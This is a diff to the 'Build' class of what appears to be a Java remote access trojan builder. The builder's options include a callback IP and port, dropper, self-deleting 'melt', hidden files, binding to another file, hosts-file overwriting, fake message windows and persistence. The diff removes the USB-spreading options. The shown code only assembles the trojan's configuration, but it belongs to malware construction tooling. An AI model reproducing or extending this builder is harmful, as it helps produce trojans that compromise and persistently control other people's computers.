@@ -45,7 +45,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String ip, int port, String ID, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean usb, String usbexclude, String usbname, boolean debugmsg, OSConfig osconfig, boolean summary) {
+	public static void build(BuildListener listener, File buildFrom, File file, String ip, int port, String ID, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary) {
 		listener.start();
 
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
@@ -112,12 +112,6 @@ public class Build {
 					config.put("timsg", traymsg);
 					config.put("timsgfail", traymsgfail);
 					config.put("tititle", traytitle);
-				}
-
-				if (usb) {
-					config.put("usb", usb);
-					config.put("usbname", usbname);
-					config.put("usbexclude", usbexclude);
 				}
 
 				for (String str : config.keySet()) {
